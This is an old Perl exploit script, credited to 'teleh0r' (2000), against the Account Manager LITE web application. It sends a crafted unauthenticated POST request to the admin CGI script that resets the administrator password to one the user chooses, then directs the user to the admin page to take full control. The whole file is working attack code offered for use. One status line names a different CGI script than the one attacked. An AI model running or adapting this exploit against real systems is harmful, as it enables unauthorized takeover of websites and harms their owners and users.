#!/usr/bin/perl -w

## Account Manager LITE 1.0x / cgi.elitehost.com
## This exploit let's you change the administrator
## password, and completely take controll.
##
## teleh0r@doglover.com / anno 2000
## httpd://teleh0r.cjb.net

use strict;
use Socket;

if (@ARGV < 2) {
    print("Usage: $0 <target> <newpass>\n");
    exit(1);
}

my($target,$newpass,$crypt,$length,$command,
   $agent,$sploit,$iaddr,$paddr,$proto);

($target,$newpass) = @ARGV;

$crypt = crypt($newpass, 'aa');
$length = 34 + length($newpass);

print("\nRemote host: $target\n");
print("CGI-script: /cgi-bin/subscribe.pl\n");
print("New password: $newpass / $crypt\n\n");

$command = "pwd=$newpass&pwd2=$newpass&setpwd=++Set+Password++";
$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";

# Note that POST /cgi-bin/amlite/amadmin.pl HTTP/1.0
# may have to be changed...

$sploit=
"POST /cgi-bin/amlite/amadmin.pl HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: $length

$command";

$iaddr = inet_aton($target)                     || die("Error: $!\n");
$paddr = sockaddr_in(80, $iaddr)                || die("Error: $!\n");
$proto = getprotobyname('tcp')                  || die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die("Error: $!\n");
connect(SOCKET, $paddr)                         || die("Error: $!\n");
send(SOCKET,"$sploit\015\012", 0)               || die("Error: $!\n");
close(SOCKET);

sleep(2);
print("Surf to http://$target/cgi-bin/amlite/amadmin.pl\n");
exit(0);
